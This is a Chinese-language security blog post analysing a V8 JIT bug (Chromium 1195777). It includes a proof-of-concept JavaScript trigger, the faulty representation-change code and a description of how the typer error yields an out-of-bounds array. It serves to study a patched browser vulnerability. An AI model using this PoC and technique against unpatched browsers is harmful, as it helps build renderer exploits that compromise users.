<!DOCTYPE html><html><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="4月14日&lt;a href=&quot;https://twitter.com/frust93717815&quot;&gt;@frust93717815&lt;/a&gt;又从twitter上爆出来了一个chrome renderer RCE exp，这个漏洞修复的commit是"><link rel="stylesheet" type="text/css" href="/css/normalize.css"><link rel="stylesheet" type="text/css" href="/css/highlight.css"><link rel="stylesheet" type="text/css" href="/css/noise.css"><title>chromium1195777 | /home/5n1p3r0010</title><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><meta name="generator" content="Hexo 5.4.0"></head><body><article class="wrapper"><div class="post-main"><div class="nav"><nav class="container"><a class="sidebar-nav-item active" href="/">Home</a><a class="sidebar-nav-item" href="/archives">Archives</a></nav><div class="container post-meta"><div class="post-tags"><a class="post-tag-none-link" href="/tags/Browser/" rel="tag">Browser</a></div><div class="post-time">2021-04-15</div></div></div><div class="container post-header"><h1>chromium1195777</h1></div><div class="container post-toc"><details class="toc"><summary class="toc-accordion">Table of Contents</summary><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol></details></div><div class="container post-content"><p>4月14日<a target="_blank" rel="noopener" href="https://twitter.com/frust93717815">@frust93717815</a>又从twitter上爆出来了一个chrome renderer RCE exp，这个漏洞修复的commit是</p>
<p><a target="_blank" rel="noopener" href="https://github.com/v8/v8/commit/fd29e246f65a7cee130e72cd10f618f3b82af232#diff-0bd8b88770d3fe0b131f9979e595c813be5d97f0aad10f4a78c40ba488c56b39">https://github.com/v8/v8/commit/fd29e246f65a7cee130e72cd10f618f3b82af232#diff-0bd8b88770d3fe0b131f9979e595c813be5d97f0aad10f4a78c40ba488c56b39</a></p>
<p>，在4月13日更新的chrome 90版本并未修复。</p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>poc</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function foo(b) &#123;</span><br><span class="line">  let x &#x3D; 0;</span><br><span class="line">  if (b) x &#x3D; -1;</span><br><span class="line">  return x &#x3D;&#x3D; Math.max(-1, x &gt;&gt;&gt; Infinity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(foo(true));</span><br><span class="line">%PrepareFunctionForOptimization(foo);</span><br><span class="line">print(foo(false));</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line">print(foo(true));</span><br></pre></td></tr></table></figure>

<p>漏洞的根源在于v8为了优化到极致，在SimplifiedLowing phase中如果节点操作数类型是singned32或者unsigned32会把SpeculativeXXX节点转化为TruncateInt64ToInt32节点，对应的代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;src&#x2F;compiler&#x2F;representation-change.cc</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">if (output_type.Is(Type::Signed32()) ||</span><br><span class="line">        output_type.Is(Type::Unsigned32())) &#123;</span><br><span class="line">      op &#x3D; machine()-&gt;TruncateInt64ToInt32();</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>对应生成的节点图及汇编码如下，对应最终生成的movl是mov命令符的32位比较形式，l表示long(32-bit integer or 64-bit floating point)。但是这样的优化会在一定情况下导致typer错误。</p>
<p><img src="image-20210415143446768.png" alt="image-20210415143446768"></p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>​    如上给出的poc中经过jit优化后结果本应是false但实际运行却是true，我们可以利用这两者的差异构造一个OOB array。</p>
<p>​    例如如下代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function foo(a) &#123;</span><br><span class="line">  let x &#x3D; -1;</span><br><span class="line">  if (a) x &#x3D; 0xFFFFFFFF;</span><br><span class="line">  return Math.sign(0 - Math.max(0, x, -1));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(foo(true));</span><br><span class="line">%PrepareFunctionForOptimization(foo);</span><br><span class="line">print(foo(false));</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line">print(foo(true));</span><br></pre></td></tr></table></figure>

<p>在SimplifiedLowing phase中SpeculativeSafeIntegerSubtract节点会转化为TruncateInt64ToInt32节点，转化前</p>
<p><img src="image-20210415141653983.png" alt="image-20210415141653983"></p>
<p>转化后</p>
<p><img src="image-20210415141806114.png" alt="image-20210415141806114"></p>
<p>对应生成的汇编使用的操作符是32位操作符movl，导致这里LoadField节点获得的是一个32位长度的值，</p>
<p><img src="image-20210415143809282.png" alt="image-20210415143809282"></p>
<p>即这里jit compler会认为Math.max(0,0xffffffff,-1)等价于Math.max(0,0xffff,-1)，导致得到错误的结果0。使用Math.max(0, x, -1)的值做为new Array的长度，再使用array.shift使array.length-1即可得到一个实际长度为0但可访问范围为0xffffffff的OOB array。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>​    已经连续两天有人爆出chrome 的renderer RCE exp了，chrome每次修复漏洞时附加poc的操作看来值得商榷。</p>
</div></div><div class="post-main post-comment"></div></article><link rel="stylesheet" type="text/css" href="/css/font.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.css"><script src="//cdn.bootcss.com/jquery/2.0.3/jquery.min.js"></script><script src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script>$(document).ready(function() {
  $(".fancybox").fancybox();
});
</script></body></html>